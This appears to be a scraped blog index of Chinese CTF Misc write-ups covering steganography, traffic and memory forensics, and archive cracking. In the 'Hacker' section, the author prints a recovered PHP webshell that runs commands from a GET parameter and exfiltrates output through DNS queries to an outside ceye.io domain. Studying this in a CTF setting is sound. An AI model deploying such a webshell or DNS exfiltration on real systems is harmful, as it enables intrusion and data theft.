flag：flag{f177a390334bfb71047cd2cd10a336a5} 题目名称 code 题目附件给了一个 code.txt，打开后发现有零宽，解密后可以得到提示：ilove0an1（猜测需要把数据转成0和1） 根据题面的提示：i love drawing，猜测是使用代码绘图，因此上面的那些代码应该是绘图代码 比赛的时候没找到，赛后和别的师傅交流的时候知道了下面这个开源项目： https://github.com/susam/cfrs 然后还有对应的在线绘图的网站： https://susam.net/cfrs.html 然后我们就可以尝试使用这个网站进行绘图，因为网站长度有限制，因此我们一段一段看 发现整个代码一共就以下几种情况： 然后我们根据上面那个零宽解出来的提示，把圆圈替换为0，有几个圆圈就有几个0，然后把竖线替换为1 就是这里要特别注意，替换的时候要仔细一点，然后圆圈要一个一个替换，要不然最后会得不到 flag 使用 CyberChef 替换然后二进制转字符串即可得到flag：flag{1_wanna_c1rcl3s_4nd_1in3s} 题目名称 grid’s Secret 题目附件给了一个 secret.txt 打开发现有很多奇怪的数据，然后在末尾发现了零宽隐写 解零宽后可以得到一个提示：4invaild 赛后和其他师傅交流了才知道，这个提示指的是前四个字符是无效的，因此可以直接删去 由题目 grid（网格）可以联想到坐标系，因此我们需要把数据划分为6个字符一组 然后用最后两个字符作为横纵坐标对表格进行填充，有数据的地方填上1，没有数据的地方都初始化为0 一开始以为是二维码，经过尝试后发现直接把二进制数据从最后一列开始连起来就行 import pandas as pd import libnum data = [] with open(\"1.txt\", 'r') as f: text = f.read() for i in range(0, len(text), 6): pos = text[i+4:i+6] data.append(pos) print(data) df = pd.DataFrame(0, index=range(24), columns=range(24), dtype=int) for point in data: x = ord(point[0]) - ord('A') y = ord(point[1]) - ord('A') df.iloc[x, y] = 1 print(df) flag = '' for y in range(23, 0, -1): for x in range(24): flag += str(df.iloc[x, y]) print(libnum.b2s(flag)) flag{M4idenh3ad_4nd_VHF} ","date":"2024-05-06","objectID":"/posts/9d73413/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 “天一永安杯”宁波市网络安全大赛 Misc Writeup","uri":"/posts/9d73413/"},{"categories":["Writeup"],"content":"从这场比赛可以看出自己还是有很多东西需要去学 感觉 Misc 很大程度上还是看经验，自己见过的东西还是太少了 题目名称 Webshell_pro 打开流量包，追踪TCP流，可以很明显的看出是一个webshell流量 用base64解码响应中的数据，一个个试过去，发现存在hint.py和小明的日记.txt 以及后面才出现的flag.txt 先base64解码，再去除换行符，最后再base64解码，即可得到请求中shell的加密代码——hint.py 叫ChatGPT写一个解密的代码，开头加上一个urldecode即可 import base64 import libnum from Crypto.PublicKey import RSA from urllib.parse import unquote pubkey_str = \"\"\"-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB -----END PUBLIC KEY----- \"\"\" prikey_str = \"\"\"-----BEGIN PRIVATE KEY----- MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVpxr9geQhUgLX2iGYTlfvfxO3EZs6CIZ5/hu932xTozjaTy8yUI8mnXCgMUM4WgFCmvhjMfhlNHo+z4c/xUQgkwbm6ItA4vF0p3GLjVAgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg== -----END PRIVATE KEY----- \"\"\" pubkey = RSA.import_key(pubkey_str) prikey = RSA.import_key(prikey_str) n = pubkey.n def dec_replace(base64_str: str): base64_str = base64_str.replace(\"e5Lg^FM5EQYe5!yF\u002662%V$UG*B*RfQeM\", \"/\") base64_str = base64_str.replace(\"n6\u0026B8G6nE@2tt4UR6h3QBt*5\u0026C\u0026pVu8W\", \"+\") base64_str = base64_str.replace(\"JXWUDuLUgwRLKD9fD6\u0026VY2aFeE\u0026r@Ff2\", \"=\") return base64_str def decrypt(cipher_text): # 使用公钥解密 plain_text = b\"\" cipher_text = base64.b64decode(dec_replace(cipher_text)) for i in range(0, len(cipher_text), 128): part = cipher_text[i:i+128] dec = libnum.n2s(pow(libnum.s2n(part), pubkey.e, n)) plain_text += dec return plain_text.decode() if __name__ == '__main__': cipher_text = input(\"请输入要解密的密文: \") cipher_text = unquote(cipher_text) decrypted_text = decrypt(cipher_text) print(\"解密后的明文为:\", decrypted_text) 然后就可以很清楚的知道shell命令都干了啥 去除换行符然后base64解码小明的日记.txt，可以得到解密的密钥 然后用这个密钥去AES解密上面得到的密文即可得到flag 题目名称 Minecraft:SEED 服务器IP: nkctf-mc-01.shenghuo2.cn / nkctf-mc-02.shenghuo2.cn / nkctf-mc-03.shenghuo2.cn 装一个 SeedCrackerX 和一个 Wurst 加速飞行跑图 然后找到5个沉船就行，mod会自己开始爆破seed Seed: 2150463978431929967 然后输入/getflag 2150463978431929967即可得到flag 题目名称 cain_is_hacker 内存取证，经典开头用 vol_all_in_one 梭一把 然后在 filescan 的结果中找到一个h4re.zip，尝试导出 桌面上那个 raw 文件应该就是题目附件给我们的 raw 文件 所以这里也没必要导出，当然也是无法导出的 解压这个压缩包，得到两个奇怪的文件，查看其中的importfile后可以知道这个是用Encfs加密后的加密卷 根据参考文章可知，我们可以在Windows下用 Encfs4win 来挂载这个加密卷 但是解密这个加密卷，需要 .encfs6.xml（即文件夹中的importfile)，以及解密的密码 因此接下来我们就需要去寻找解密的密码 比赛的时候一直在找破解这个密码的方法，找到了一个 CVE-2014-3462，但是没有能用的exp 查看 psscan 命令的结果，可以发现存在 StikyNot 进程，这个是Windows自带的便签软件 参考Lazzaro大佬的博客可知 StikyNot 的文件会保存在C:\\Users\\XXX\\AppData\\Roaming\\Microsoft\\Sticky Notes\\目录下 因此在文件中搜索 Sticky Notes ，发现有一个StickyNotes.snt文件，尝试导出 比赛的时候就是卡在了这里，因为这个文件需要用Windows7的便签或记事本打开，然后Win11下是无法直接查看的 官方的wp说的是这个东西需要用 WIndows7 的虚拟机打开，这里真的很坑，要专业版的Win7才有 这里需要将这个.snt文件放到C:\\Users\\XXX\\AppData\\Roaming\\Microsoft\\Sticky Notes\\路径下 最后再打开便签即可看到下面这样的一串字符串 将得到的字符串base58解码后即可得到解密的密码：welcome_to_NkCTF_and_this_is_the_enkey 然后将importfile重命名为.encfs6.xml然后用Encfs MP直接挂载即可 挂载后打开挂载的磁盘，得到一个ez.xlsx 无法使用Excel直接打开，于是我们使用010打开，发现vba字符，因此猜测存在宏 因此我们直接使用olevba分析文件中的vba代码，发现存在base64解码的操作 用CyberChef解码后得到一些未知的Hex值 联系题面猜测这个就是被勒索病毒加密后的flag文件 在fault的配合下，cain宝成功入侵了我的电脑，她使用勒索软件加密了flag文件并将其隐藏了起来。当我发现的时候，cain早已将她使用的勒索软件和密钥删除了，但是匆忙下她还是留下了一些信息，你能在内存中获取并解密flag文件吗？ 因此，我接下来要去寻找那个勒索病毒的信息，看看是哪种勒索病毒并尝试寻找它的解密方式 在Console命令的结果中发现hidden-tear.exe文件 网上一搜，发现这个程序就是我们要找的勒索病毒 已知它是完全开源的，因此我们在github中搜索，发现它连解密的软件一起开源了 但是这个解密软件好像不是很好用，这里贴一个更好用的解密软件 运行 Hid","date":"2024-04-30","objectID":"/posts/e0d44f3/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 NKCTF Misc Writeup","uri":"/posts/e0d44f3/"},{"categories":null,"content":"Lunatic's friends","date":"2024-04-28","objectID":"/friends/","tags":null,"title":"🔗Friends","uri":"/friends/"},{"categories":null,"content":" A1natas Bi0x - ByteDance✌️ Peco - Misc \u0026 Tencent✌️ Bmth - 传奇学长 \u0026 Web佬 Niyah - Pwn神 W4ke - Police👮 Xux - Web神 WoodWhale - 全栈 \u0026 Baidu✌️ @r3kapig Xunflash - Re神 Fup1p1 - Re \u0026 Alibaba✌️ @V\u0026N X1ao - Crypto神 \u0026 NKU🎓 enllus1on - Pwn @Nu1L \u0026 NKU🎓 AsaL1n - Web @V\u0026N Straw - Reverse \u0026 拼多多✌️ CHHHCHHOH - Web \u0026 XDU🎓 Carbofish - Reverse @r3kapig Pangbai - Re @W\u0026M \u0026 快手✌️ C3ngH - Misc @W\u0026M A1ic3 - Crypto @V\u0026N T10ing - Web \u0026 女师傅 void2eye - Web @狼组安全-WpgSec haunghunr - Reverse \u0026 @Nu1L 温婳霂 - Misc @V\u0026N MetaVi - Misc @N0wayBack CTFer LilRan - Re \u0026 Musc @S1uM4i 今日启程 无畏向前 Z3n1th - Misc @r3kapig N1ght - Web @星盟安全 w3nx1z1 - Misc @W\u0026M 1cePeak - Misc @Nepnep shenghuo2 - Misc @N0wayBack ch0en3 - Pwn @星盟安全 yichen - 全栈佬 Alexander - Misc 努力成为一个成功的musc手 baozongwi - 包师傅 @SU Hacking the future 秋雨渐冷 s1rius 小转风 Friend Link Format - nickname: Lunatic avatar: https://www.nssctf.cn/files/2024/4/28/7f130a1387.png url: https://goodlunatic.github.io/ description: Mind and Hand :) Notice If you want to exchange link, you can send it to me by Email or QQ. Website failure, stop maintenance and improper content may be unlinked! ","date":"2024-04-28","objectID":"/friends/:0:0","tags":null,"title":"🔗Friends","uri":"/friends/"},{"categories":["Writeup"],"content":"2024 帕鲁杯 Misc Writeup 题目名称 签到 中文ascii码 flag{TreJaiuLT1rgbdfG0Eay} 题目名称 FM 145.8 直接SSTV开扫就行 flag{19b4dD77bF3c66f91c23F5A25Bc314CB} 题目名称 350×350 jpg图片foremost一下可以得到一个zip文件，解压后发现docx的结构，改后缀为.docx再打开 伏羲六十四卦解密 s = '井兑未济大畜咸益升归妹旅中孚剥噬嗑小过中孚震归妹升兑艮随旅随蒙颐升益蛊颐咸涣豫兑咸观艮益升中孚复睽咸观解临旅涣噬嗑屯' dic = {'坤': '000000', '剥': '000001', '比': '000010', '观': '000011', '豫': '000100', '晋': '000101', '萃': '000110', '否': '000111', '谦': '001000', '艮': '001001', '蹇': '001010', '渐': '001011', '小过': '001100', '旅': '001101', '咸': '001110', '遁': '001111', '师': '010000', '蒙': '010001', '坎': '010010', '涣': '010011', '解': '010100', '未济': '010101', '困': '010110', '讼': '010111', '升': '011000', '蛊': '011001', '井': '011010', '巽': '011011', '恒': '011100', '鼎': '011101', '大过': '011110', '姤': '011111', '复': '100000', '颐': '100001', '屯': '100010', '益': '100011', '震': '100100', '噬嗑': '100101', '随': '100110', '无妄': '100111', '明夷': '101000', '贲': '101001', '既济': '101010', '家人': '101011', '丰': '101100', '离': '101101', '革': '101110', '同人': '101111', '临': '110000', '损': '110001', '节': '110010', '中孚': '110011', '归妹': '110100', '睽': '110101', '兑': '110110', '履': '110111', '泰': '111000', '大畜': '111001', '需': '111010', '小畜': '111011', '大壮': '111100', '大有': '111101', '夬': '111110', '乾': '111111'} li = [] k = 0 for i in range(len(s)): if k == 1: k = 0 continue try: li.append(dic[s[i]]) except: t = '' t = t+s[i]+s[i+1] li.append(dic[t]) k = 1 ss = ''.join(li) print(ss) enc = '' for i in range(0, len(ss), 8): enc += chr(eval('0b'+ss[i:i+8])) print(enc) 得到压缩包密码：6470e394cbf6dab6a91682cc8585059b 解压压缩包后得到一个伪加密的压缩包，去除伪加密，可以得到一张 jpg 直接 foremost 可以得到一个压缩包，解压后得到两张 png 图片 经过尝试，发现是盲水印加密的一种 https://github.com/guofei9987/blind_watermark 根据题目名称猜测分辨率是 350x350，直接写个脚本提取即可得到一张二维码 # -*- coding: utf-8 -*- import cv2 from blind_watermark import WaterMark import os bwm1 = WaterMark(password_wm=1, password_img=1) # 注意需要设定水印的长宽wm_shape bwm1.extract('33.png', wm_shape=(350, 350), out_wm_name='output.png', mode='img') 扫码即可得到flag：flag{b3bd61023d129f9e39b4a26b98c0f366} 题目名称 江 flag{湖北省武汉市江汉二路与江汉路步行商业街交叉路口} 题目名称 ez_misc 题目附件给了一个伪加密的压缩包，直接去除伪加密然后解压可以得到一个加密的 rar 和 一张 jpg jpg 末尾有很多多余的空白数据 经过尝试不是 whitespace ，而是 SNOW，将多余数据另存为一个新文件 然后直接SONW解密即可得到压缩包密码：Carefree and carefree 然后使用得到的密码解压rar即可得到 flag：flag{b220116fc6ca827ecf3cb6c6c06dac26} 题目名称 为什么我的新猫猫喂不饱 题目附件给了一个压缩包，解压得到一张 gif 和一张 png 010打开 gif，在末尾可以看到多余的数据，看到关键的 UOZT{ 直接拉入随波逐流一把梭，可以得到前半部分的 flag：flag{my_ca1_ssg5? 然后使用 ffmpeg 命令分帧 ffmpeg -i Mycatisreallyhungry.gif frame%04d.png 然后发现第23帧的图片和那张png是一样的，猜测这里还有盲水印 经过尝试，发现是频域水印，直接使用网上的脚本解密即可 最后经过尝试，得到最后的 flag：flag{my_ca1_1s_Fu11} 题目名称 什么协议 题目附件给了一个流量包，翻看一下 http 和 tcp 流，发现很多 curl 命令的特征\\n直接导出所有的 HTTP 对象，然后在其中发现下载了一个网页 直接用 CyberChef 提取出网页数据，然后仔细翻看一下，发现在末尾有疑似 flag 的字符串 最后直接使用最新版的随波逐流一把梭了，发现是块排序压缩BWT编码 flag{go0d_finder_f0r_th1s} ","date":"2024-04-28","objectID":"/posts/a907e2b/:0:0","tags":["CTF","Writeup","Misc"],"title":"2024 帕鲁杯 Misc Writeup","uri":"/posts/a907e2b/"},{"categories":["CTF"],"content":"这两天刷题的时候做到了这道比较有意思的题目，于是就打算稍微总结一下。 本题考察的知识点：pyc反编译、zip伪加密、DeEgger Embedder、base32隐写、OPT加密算法、二进制数据转图片 题目附件给了一个后缀为 .pyc 文件，010打开仔细查看数据，发现有倒置的 flag1 和 flag2 因此猜测数据杯倒置了，因此我们写个 python 脚本将数据倒置回来 然后 foremost 一下可以得到一个伪加密的压缩包，压缩包的注释中有 flag1 和 flag2 去除伪加密后解压可以得到一个 Dream It Possible.mp3 在这个 mp3 文件的备注中发现有一串开头为 163key 的奇怪字符 网上查了一下发现是网易云导出 flac 的时候会带有的标记，对解题没有什么用 看了网上的 wp 后知道了这里需要使用 DeEgger Embedder 提取出隐藏的数据 用上面那个工具可以提取出一大串 base32 编码的字符串，直接解码发现没有得到什么有用的信息 因此我们这里尝试 base32 隐写，这里我就偷懒直接使用 PuzzleSolver 一把梭了 提取base32隐写的数据可以得到一大串二进制的字符，这里还不知道具体干啥用，转图片也没有发现有用的信息 因此我们回头分析那个 pyc 文件，直接使用 uncompyle6 就可以反编译出原来的 Python 源码 uncompyle6 .\\reverse_1_PyHaHa.pyc \u003e decompile.py # uncompyle6 version 3.9.1 # Python bytecode version base 2.7 (62211) # Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May 3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)] # Embedded file name: Fl4g.py # Compiled at: 2017-07-02 00:15:33 from os import urandom def generate(m, k): result = 0 for i in bin(m ^ k)[2:]: result = result \u003c\u003c 1 if int(i): result = result ^ m ^ k if result \u003e\u003e 256: result = result ^ P return result def encrypt(seed): key = int(urandom(32).encode('hex'), 16) while True: yield key key = generate(key, seed) + 233333333333L def convert(string): return int(string.encode('hex'), 16) P = 115792089237316195423570985008687907853269984665640564039457584007913129640997L flag1 = 'ThIs_Fl4g_Is_Ri9ht' flag2 = 'Hey_Fl4g_Is_Not_HeRe' key = int(urandom(32).encode('hex'), 16) data = open('data.txt', 'r').read() result = encrypt(key) encrypt1 = bin(int(data, 2) ^ eval('0x' + hex(result.next())[2:-1] * 22))[2:] encrypt2 = hex(convert(flag1) ^ result.next())[2:-1] encrypt3 = hex(convert(flag2) ^ result.next())[2:-1] print 'flag1:', encrypt2 print 'flag2:', encrypt3 f = open('encrypt.txt', 'w') f.write(encrypt1) f.close() # okay decompiling .\\reverse_1_PyHaHa.pyc 分析上面的加密，赛后看了 wp 知道了是 OPT 加密（加密原理的具体分析在文末） 由上述代码可知我们之前得到的二进制数据应该就是上述代码中的 encrypt.txt 因此我们写一个 Python 脚本去还原出原来的数据，具体脚本如下： from PIL import Image import libnum import os def generate(m, k): result = 0 for i in bin(m ^ k)[2:]: result = result \u003c\u003c 1 if int(i): result = result ^ m ^ k if result \u003e\u003e 256: result = result ^ P return result def draw2pic(data): if os.path.exists(\"pic_output\"): print(\"[!] pic_output 目录已存在\") else: print(\"[+] pic_output 目录创建成功\") os.mkdir(\"pic_output\") length = len(data) dic = {X: int(length / X) for X in range(1, length) if length % X == 0} for item in dic.items(): pos = 0 img = Image.new(\"RGB\", (item[0], item[1])) for x in range(item[0]): for y in range(item[1]): if data[pos] == '0': img.putpixel([x, y], (0, 0, 0)) else: img.putpixel([x, y], (255, 255, 255)) pos += 1 img.save(f\"./pic_output/{item[0]}_{item[1]}.png\") print( f\"./pic_output/{item[0]}_{item[1]}.png Saved!\") if __name__ == \"__main__\": P = 115792089237316195423570985008687907853269984665640564039457584007913129640997 flag1 = 'ThIs_Fl4g_Is_Ri9ht' flag2 = 'Hey_Fl4g_Is_Not_HeRe' encrypt2 = 0xec8d57d820ad8c586e4be0122b442c871a3d71cd8036c45083d860caf1793ddc encrypt3 = 0xc40a0be335babcfbd8c47aa771f6a2ceca2c8638caa5924da58286d2a942697e encrypt1 = open('encrypt.txt', 'r').read() key2 = encrypt2 ^ libnum.s2n(flag1) key3 = encrypt3 ^ libnum.s2n(flag2) print(key2) print(key3) tmp = key3 - 233333333333 for i in range(0, 255): tmp = generate(tmp, 0) seed = tmp ^ key2 print('Found seed:', seed) print('use seed generate key3:', generate(key2, seed)+233333333333) tmp = key2 - 233333333333 for i in range(0, 255): tmp = generate(tmp, 0) key1 = tmp ^ seed print('Found key1:', key1) print('use key1 generate key2:', generate(key1, seed)+233333333333) tmp1 = hex(int(encrypt1, 2)) tmp2 = '0x'+hex(key1)[2:]*22 pic_data = bin(int(tmp1, 16) ^ int(tmp2, 16))[2:] draw2pic(pic_data) 脚本运行后即可得到有 flag 的图片 OPT(One-Time Pad)（一次性密码本）加密详解 TODO ","date":"2024-04-18","objectID":"/posts/bc64ef8/:0:0","tags":["CTF","Misc"],"title":"攻防世界 Misc pyHAHA 题目详解","uri":"/posts/bc64ef8/"},{"categories":["Writeup"],"content":"连续打了两年的红明谷了，两次都没进决赛，红明谷的Misc题也是一如既往的抽象。 阿尼亚 题目附件给了一个 flag.zip 和 netpixeljihad.png，因此猜测 png 就是 pixeljihad 加密 png 图片末尾有额外的数据，010 提取出来使用 CyberChef 两次Hex解码 +Text Encoding Brute Force 即可得到：密码为：简单的编码 使用得到的密码用 在线网站解密即可得到压缩包密码：P@Ss_W0RD:) 用得到的密码解压压缩包，可以得到如下编码，一眼 Decabit 编码 +-+-–+- —+-- -+–-- +–-– –+++++— -—+- +++-+-+— +-+-+— —+++-- -+–-- -+–+++-+- -+–-- -+–-- -+-+-+– -+–+++-+- -—+- -++++—+- -+–-- -+-+-+– +-+++—+- +++-—- —+++-- +-+-+— -+-+-+– +-+-+–- –+–- -++++—+- +—+++-+- -+-+-+– -++++—+- -+–+++-+- +–+-+-- +++-+-+— +-+++—+- -+–+-+++- -+–-- —+++-- ++++—-+- -++++—+- -+–+++-+- -+–-++- —-+++++- 直接使用 在线网站 解密即可得到 flag{386baeaa-e35a-47b6-905d-5e184cab25ea} Hacker 题目附件给了一个流量包，追踪流量包的 HTTP流 可以看出应该是传了一个名为 xxx1.php 的 webshell，从而实现了 RCE 在流2中发现了上传的 webshell 的源码 fileContent=\u003c?php file_put_contents('/app/zentaopms/www/xxx1.php', '\u003c?php $servername=\"127.0.0.1\"; $username=\"root\"; $password=\"123456\"; $dbname=\"zentao\"; $conn=new PDO(\"mysql:host=$servername;dbname=$dbname\",$username,$password); $conn-\u003esetAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); // 从这里可以看出后面要用的密钥是admin用户的密码 $stmt=$conn-\u003eprepare(\"SELECT password FROM zt_user WHERE account=\\'admin\\'\"); $stmt-\u003eexecute(); $result=$stmt-\u003efetch(PDO::FETCH_ASSOC); $conn=null; $param=$_GET[\"cmd\"]; $password=$result[\"password\"]; $output=shell_exec($param); $hex_output=bin2hex($output); $hex_password=bin2hex($password); $len_output=strlen($hex_output); $len_password=strlen($hex_password); $max_subdomain_length=62; $subdomain_base=\"yafgcy.ceye.io\"; $hex_xor=\"\"; for ($i=0;$i\u003c$len_output;$i++) { $char_output=$hex_output[$i]; $char_password=$hex_password[$i%$len_password]; $char_xor=dechex(hexdec($char_output)^hexdec($char_password)); if(strlen($hex_xor.$char_xor)\u003e$max_subdomain_length) { if(strlen($hex_xor)%2!=0) { $subdomain=\"0\".\"$hex_xor.$subdomain_base\"; } else { $subdomain=\"$hex_xor.$subdomain_base\"; } gethostbyname($subdomain); $hex_xor=\"\"; } else { $hex_xor.=$char_xor; } } // 将命令执行的结果通过 DNS log 外带 if(strlen($hex_xor)%2!=0) { $subdomain=\"0\".\"$hex_xor.$subdomain_base\"; } else { $subdomain=\"$hex_xor.$subdomain_base\"; } gethostbyname($subdomain); ?\u003e');?\u003e 从上面的源码中可以看到命令执行的返回结果通过 DNS log 外带了，因此我们需要关注请求包中的域名字段 在流2中也可以看到 admin 的密码被 SQL 注入注出来了 admin:8a3e684c923b763d252cf1e8734a7a29 现在有了加密的源码和密钥，就可以恢复原来的命令返回结果了 首先使用 tshark 提取出 dns.qry.name 字段的值，并筛选出含有 yafgcy.ceye.io 的数据 筛选并删去 yafgcy.ceye.io 后可以得到下面的数据 59115a4b465044695a5a56015c4252065e501c130e416f5c5647556b510044 05b0e5d4b5f5b5b69505c57074f18430c423f5b0c0852105a521d4409476b5 4a32135c07594c474d4d4a47684453501657411c171e456f4c5f5659043d19 0c495011391d4e40054d495a4368 79227024716c7522787370254c777230667673222570247b76677322632671 d7b357226771575227a7372237677702573611f372570317b7672772076206 1479207024777b60247e6674231a626727666171372570317f766773207620 067879226731756c60206d75703670754e 然后我们根据源码中的加密逻辑，直接使用 CyberChef 异或 admin 的密码即可 解密字符串的时候需要注意有些密文解密时需要删去前面部分字符 解密最后四条数据可以得到奇怪的字符串，赛后知道了这是 DNA 编码 所有得到的字符串如下所示 ACCAGTAAAACG{AATTCAACAACATGCTGC CTACA-AACAAAAACAAT-TCATCAACAAA4 AACAACTGGTGA-TTCTTCTCATGATGAAA ACTTCTTCTGCTGC} 参考 DNA编码 中的对照表以及结合 flag 是 uuid字母全小写 的格式，可以看出编码头部和尾部有部分数据丢失 ACC AGT AAA ACG{AAT TCA ACA ACA TGC TGC f l a g { d 1 e e 6 6 ?CT ACA-AAC AAA AAC AAT - TCA TCA ACA AA? h/x/4 e - b a b d - 4 4 i a/q AAC AAC TGG TGA - TTC TTC TCA TGA TGA AA? b b 7 5 - 0 2 1 5 5 a/q ?AC TTC TTC TGC TGC} b/r 0 0 6 6} 通过对上面几个位置的字符进行爆破，即可得到最终flag: flag{d1ee664e-babd-11ed-bb75-00155db0066} X光的秘密 题目附件给了一个 task.dcm 文件，根据 参考文章 用 MicroDicom 打开发现有20张图片，尝试导出 这里导出的时候要注意 不要勾选保留注释 ，然后以 没有覆盖 的格式导出 导出来后发现有20张png的图片，然后用 Stegsolve 逐一查看每张图片，在最后三张图片中发现 LSB 的痕迹 下图中标红的地方就是 LSB 隐写的痕迹 赛后看了别的大佬的 wp 知道这里是把后面三张图片红色0通道的数据转为二进制，然后一位一位拼接起来 其实这里红色0通道、蓝色0通道、绿色0通道都有LSB隐写，并且隐写的数据都是一样的，因此随便选哪个都行 这里我们就比较常规的选择红色0通道的数据，这里可以用 stegsolve 直接导出数据，或者也可以用脚本提取 0x91: 1001 0001 0x61: 0110 0001 0x16: 0001 0110 # 将上面三段数据的每位二进制值连起来 100010010101000001001110 0x89 0x50 0x4e # 很明显出现了 png 的文件头 from PIL import Image import libnum def get_LSB(filepath): image = Image.open(filepath) width, height = image.size # print(width, height) ls","date":"2024-04-07","objectID":"/posts/e49ecc5/:0:0","tags":["CTF","Misc","Writeup"],"title":"2023\u00262024 红明谷初赛 Misc Writeup","uri":"/posts/e49ecc5/"},{"categories":["Writeup"],"content":"不愧是竞速长城杯，时间这么短，只能说强度很高。 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 压一压 题目附件给了一个 压一压.zip，然后里面有一个 flag.7z 和一个 pass.txt pass.txt 中是一串有一个 ? 的字符串，经过尝试发现是掩码爆破 试着手动解了几层，发现一共有三种类型的压缩包：7z、rar、zip 于是写一个 Python 脚本逐层爆破解套即可 全部解压完以后可以得到一个 flag.txt ，内容如下 congratulations ，but did you notice the \"?\" ,combine all of them plz. 由此可知有信息隐藏在了掩码中的?里，于是进一步修改脚本，提取每层密码中的?位置的字符 全部提取完后，仔细观察发现了 89504e470d0a 这个图片的文件头，使用 CyberChef 转为图片可以得到下图 由这个提示可知，压缩包的后缀隐写了摩斯电码，修改脚本将隐写的数据提取出来，然后解摩斯电码即可得到 flag 完整的提取脚本如下： from string import printable import zipfile import rarfile import py7zr import os def decompress_7z(archive_file): with py7zr.SevenZipFile(archive_file, 'r') as archive: file_list = archive.list() new_archive_file = file_list[0].filename table = printable[:62] with open(\"pass.txt\", 'r') as f: part_passwd = f.read().strip() for item in table: passwd = part_passwd.replace(\"?\", item) try: # print(f\"正在尝试密码：{passwd}\") with py7zr.SevenZipFile(archive_file, mode='r', password=passwd) as archive: archive.extractall(\"tmp/\") print(f\"用{passwd}成功解压缩\") data.append(item) break except: pass os.remove(archive_file) os.remove(\"pass.txt\") os.system(\"mv tmp/* .\") os.rmdir(\"tmp\") return new_archive_file def decompress_rar(archive_file): with rarfile.RarFile(archive_file, 'r') as rar_ref: file_list = rar_ref.namelist() new_archive_file = file_list[0] # print(new_archive_file) table = printable[:62] with open(\"pass.txt\", 'r') as f: part_passwd = f.read().strip() for item in table: passwd = part_passwd.replace(\"?\", item) try: # print(f\"正在尝试密码：{passwd}\") with rarfile.RarFile(archive_file, 'r') as rar_ref: rar_ref.extractall(path=\"tmp/\", pwd=passwd.encode()) print(f\"用{passwd}成功解压缩\") data.append(item) break except: pass os.remove(archive_file) os.remove(\"pass.txt\") os.system(\"mv tmp/* .\") os.rmdir(\"tmp\") return new_archive_file def decompress_zip(archive_file): with zipfile.ZipFile(archive_file, 'r') as zip_ref: file_list = zip_ref.namelist() new_archive_file = file_list[0] os.mkdir(\"tmp\") table = printable[:62] with open(\"pass.txt\", 'r') as f: part_passwd = f.read().strip() for item in table: passwd = part_passwd.replace(\"?\", item) try: # print(f\"正在尝试密码：{passwd}\") with zipfile.ZipFile(archive_file, 'r') as zip_ref: zip_ref.extractall(path=\"tmp/\", pwd=passwd.encode()) print(f\"用{passwd}成功解压缩\") data.append(item) break except: pass os.remove(archive_file) os.remove(\"pass.txt\") os.system(\"mv tmp/* .\") os.rmdir(\"tmp\") return new_archive_file if __name__ == \"__main__\": data = [] morse_code = [] archive_file = \"flag.7z\" # archive_file = \"flag.zip\" # archive_file = \"flag.rar\" while True: if \"7z\" in archive_file: archive_file = decompress_7z(archive_file) morse_code.append(\"-\") elif \"rar\" in archive_file: archive_file = decompress_rar(archive_file) morse_code.append(\"/\") elif \"zip\" in archive_file: archive_file = decompress_zip(archive_file) morse_code.append(\".\") else: break print(\"掩码隐写内容如下：\") print(\"\".join(data)) print(\"后缀隐写内容如下\") print(\"\".join(morse_code)) 题目名称 Flow 题目附件给了一个流量包，打开，拉到最下面，追踪TCP流 看到一串熟悉的字符串，base32解码即可得到 flag：flag{0ddeff-g9ef9ef0-defffef-mkt25gtf-kf} 题目名称 pcap 题目附件给了一个流量包，打开发现主要是 HTTP 和 TCP 流量 尝试直接导出 HTTP 对象，筛选一下，发现在里面发现一个 file.zip 直接导出即可得到一个加密的压缩包 在压缩包的注释中得到 key:66666666，压缩包中还有一个 1.txt 直接用 010 打开压缩包，尝试修改两个加密位后发现是伪加密 解压压缩包后可以得到一大串 base64 编码后的字符串，猜测是 base64隐写，这里就偷懒直接用 Puzzle Solver 一把梭了 解密 base64 隐写后可以得到密文，结合之前得到的 key，经过尝试发现是 DES 加密 因此我们直接 DES 解密即可得到 flag：flag{2_Hell0_ctf_world_2} 题目名称 clocked 题目附件给了一个压缩包，打开发现缺少了文件头，给它补上 504B0304 解压后得到了一个 elephant 文件，用010打开发现是一张base64编码后的图片 用CyberChef解码即可得到以下图片 然后用 cloacked-pixel 解密即可，密钥就是 cloacked-pixel 然后用010打开发现是个压缩包，该后缀为 zip 解压即可得到flag flag{just_a_demo_picture} 题目名称 ctfer 